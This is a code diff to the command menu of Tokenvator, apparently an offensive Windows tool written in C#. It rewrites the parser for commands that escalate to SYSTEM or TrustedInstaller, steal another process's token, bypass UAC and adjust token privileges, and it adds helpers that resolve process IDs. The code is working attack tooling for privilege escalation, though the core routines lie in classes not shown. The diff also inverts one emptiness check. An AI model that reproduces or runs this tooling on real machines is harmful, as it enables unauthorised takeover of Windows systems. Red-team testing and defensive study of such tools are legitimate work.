@@ -19,71 +19,81 @@ namespace Tokenvator
         ////////////////////////////////////////////////////////////////////////////////
         static void Main(string[] args)
         {
+            Int32 processID;
+            String command;
+            IntPtr currentProcessToken;
             while (true)
             {
                 try
                 {
                     Console.Write("(Tokens) > ");
                     String input = Console.ReadLine();
-                    if (input.ToLower().Contains("getsystem"))
+                    
+                    switch(NextItem(ref input))
                     {
-                        String[] split = input.Split(' ');
-                        if (split.Length >= 2)
-                        {
-                            new Tokens().GetSystem(split[1]);
-                        }
-                        else
-                        {
-                            new Tokens().GetSystem("cmd.exe");
-                        }
-                    }
-                    else if (input.ToLower().Contains("gettrustedinstaller"))
-                    {
-                        String[] split = input.Split(' ');
-                        if (split.Length >= 2)
-                        {
-                            new Tokens().GetTrustedInstaller(split[1]);
-                        }
-                        else
-                        {
-                            new Tokens().GetTrustedInstaller("cmd.exe");
-                        }
-                    }
-                    else if (input.ToLower().Contains("stealtoken"))
-                    {
-                        String[] split = input.Split(' ');
-                        if (split.Length >= 3)
-                        {
-                            new Tokens().StartProcessAsUser(Int32.Parse(split[1]), split[2]);
-                        }
-                        else
-                        {
-                            new Tokens().StartProcessAsUser(Int32.Parse(split[1]), "cmd.exe");
-                        }
-                    }
-                    else if (input.ToLower().Contains("bypassuac"))
-                    {
-                        String[] split = input.Split(' ');
-                        if (split.Length >= 3)
-                        {
-                            new RestrictedToken().BypassUAC(Int32.Parse(split[1]), split[2]);
-                        }
-                        else
-                        {
-                            new RestrictedToken().BypassUAC(Int32.Parse(split[1]), "cmd.exe");
-                        }
-                    }
-                    else if (input.Contains("exit"))
-                    {
-                        return;
-                    }
-                    else
-                    {
-                        Console.WriteLine("Invalid Options");
-                        Console.WriteLine("GetSystem            <new_process>");
-                        Console.WriteLine("GetTrustedInstaller  <new_process>");
-                        Console.WriteLine("StealToken           <process_id> <new_process>");
-                        Console.WriteLine("BypassUAC            <process_id> <new_process>");
+                        case "listprivileges":
+                            Unmanaged.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
+                            Tokens.EnumerateTokenPrivileges(currentProcessToken);
+                            break;
+                        case "setprivilege":
+                            Unmanaged.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
+                            Tokens.SetTokenPrivilege(ref currentProcessToken, input);
+                            break;
+                        case "getsystem":
+                            if (String.Empty == NextItem(ref input))
+                            {
+                                new Tokens().GetSystem();
+                            }
+                            else
+                            {
+                                new Tokens().GetSystem(input);
+                            }
+                            break;
+                        case "gettrustedinstaller":
+                            if (String.Empty != NextItem(ref input))
+                            {
+                                new Tokens().GetTrustedInstaller();
+                            }
+                            else
+                            {
+                                new Tokens().GetTrustedInstaller(input);
+                            }
+                            break;
+                        case "stealtoken":
+                            if (GetProcessID(input, out processID, out command))
+                            {
+                                if (String.IsNullOrEmpty(command))
+                                {
+                                    new Tokens().ImpersonateUser(processID);
+                                }
+                                else
+                                {
+                                    new Tokens().StartProcessAsUser(processID, command);
+                                }
+                            }
+                            break;
+                        case "bypassuac":
+                            if (GetProcessID(input, out processID, out command))
+                            {
+                                new RestrictedToken().BypassUAC(processID, command);
+                            }
+                            break;
+                        case "exit":
+                            return;
+                        default:
+                            Console.WriteLine();
+                            Console.WriteLine("Options");
+                            Console.WriteLine("-------");
+                            Console.WriteLine("GetSystem            <new_process>");
+                            Console.WriteLine("GetTrustedInstaller  <new_process>");
+                            Console.WriteLine("StealToken           <process_id> <new_process>");
+                            Console.WriteLine();
+                            Console.WriteLine("ListPrivileges       <process_id>");
+                            Console.WriteLine("SetPrivilege         <process_id> <privilege>");
+                            Console.WriteLine();
+                            Console.WriteLine("BypassUAC            <process_id> <new_process>");
+                            Console.WriteLine();
+                            break;
                     }
                 }
                 catch (Exception error)
@@ -95,88 +105,52 @@ namespace Tokenvator
 
                 }
             }
-                                     
-                   
         }
 
-        
-
-        
-        
-
-        
-
-        
-
-        
-
-        
-        /*
         ////////////////////////////////////////////////////////////////////////////////
+        // Identifies a process to access
         ////////////////////////////////////////////////////////////////////////////////
-        private static void CreateProcessAsUser(IntPtr phNewToken, String name, String arguments)
+        private static Boolean GetProcessID(String input, out Int32 processID, out String command)
         {
-            IntPtr lpProcessName = Marshal.StringToHGlobalUni(name);
-            IntPtr lpProcessArgs = Marshal.StringToHGlobalUni(name);
-            Structs._SECURITY_ATTRIBUTES lpProcessAttributes = new Structs._SECURITY_ATTRIBUTES();
-            Structs._SECURITY_ATTRIBUTES lpThreadAttributes = new Structs._SECURITY_ATTRIBUTES();
-            Structs._STARTUPINFO startupInfo = new Structs._STARTUPINFO();
-            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Structs._STARTUPINFO));
-            Structs._PROCESS_INFORMATION processInformation = new Structs._PROCESS_INFORMATION();
-            if (!Unmanaged.CreateProcessAsUser(
-                phNewToken,
-                lpProcessName,
-                lpProcessArgs,
-                ref lpProcessAttributes,
-                ref lpThreadAttributes,
-                false,
-                Enums.CREATION_FLAGS.NONE,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                ref startupInfo,
-                out processInformation))
+            String name = NextItem(ref input);
+            command = "";
+            if (String.IsNullOrEmpty(input))
             {
-                GetError("CreateProcessAsUser: ");
-                return;
+                command = "cmd.exe";
             }
-            Console.WriteLine("[+] Created process: " + processInformation.dwProcessId);
-            Console.WriteLine("[+] Created thread: " + processInformation.dwThreadId);
-        }
 
+            processID = 0;
+            if (Int32.TryParse(name, out processID))
+            {
+                return true;
+            }
+
+            Process[] process = Process.GetProcessesByName(input);
+            if (0 < process.Length)
+            {
+                processID = process.First().Id;
+                return true;
+            }
+            return false;
+        }
+        
         ////////////////////////////////////////////////////////////////////////////////
+        // Pops an item from the input and returns the item - only used in inital menu
         ////////////////////////////////////////////////////////////////////////////////
-        private static void CreateProcessAsUserW(IntPtr phNewToken, String name, String arguments)
+        public static String NextItem(ref String input)
         {
-            IntPtr lpProcessName = Marshal.StringToHGlobalUni(name);
-            IntPtr lpProcessArgs = Marshal.StringToHGlobalUni(name);
-            Structs._SECURITY_ATTRIBUTES lpProcessAttributes = new Structs._SECURITY_ATTRIBUTES();
-            Structs._SECURITY_ATTRIBUTES lpThreadAttributes = new Structs._SECURITY_ATTRIBUTES();
-            Structs._STARTUPINFO startupInfo = new Structs._STARTUPINFO();
-            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Structs._STARTUPINFO));
-            Structs._PROCESS_INFORMATION processInformation = new Structs._PROCESS_INFORMATION();
-            if (!Unmanaged.CreateProcessAsUserW(
-                phNewToken,
-                lpProcessName, 
-                lpProcessArgs,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                false,
-                Enums.CREATION_FLAGS.NONE,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                ref startupInfo,
-                out processInformation
-            ))
+            String option = "";
+            String[] options = input.Split(new String[] { " " }, StringSplitOptions.RemoveEmptyEntries);
+            if (options.Length > 1)
             {
-                GetError("CreateProcessAsUserW: ");
-                return;
+                option = options[0];
+                input = String.Join(" ", options, 1, options.Length - 1);
             }
-            Console.WriteLine("[+] Created process: " + processInformation.dwProcessId);
-            Console.WriteLine("[+] Created thread: " + processInformation.dwThreadId);
+            else
+            {
+                option = input;
+            }
+            return option.ToLower();
         }
-
-        
-        */
-        
     }
 }
